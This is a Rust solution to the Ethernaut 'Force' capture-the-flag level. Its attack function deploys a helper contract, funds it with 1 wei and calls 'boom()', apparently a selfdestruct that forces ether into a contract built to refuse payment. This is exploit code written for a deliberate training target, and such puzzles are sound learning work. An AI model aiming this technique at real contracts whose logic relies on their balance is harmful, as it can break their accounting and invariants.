use crate::abi::money_giver::MoneyGiver;
use async_trait::async_trait;
use ctf::ethernaut::lvl07_force::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    /**
     * @title Ethernaut Level 7: Force
     *
     * Some contracts will simply not take your money
     * ¯\_(ツ)_/¯
     *
     * The goal of this level is to make the balance of
     * the contract greater than zero.
     *
     * Things that might help:
     * - Fallback methods
     * - Sometimes the best way to attack a contract is
     *   with another contract.
     */
    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = MoneyGiver::deploy(offender.to_owned(), target.address)?
            .send()
            .await?;
        contract.deposit().value(1).send().await?;
        /* let balance = offender.get_balance(contract.address(),
         * None).await?; */
        contract.boom().send().await?;
        Ok(())
    }
}
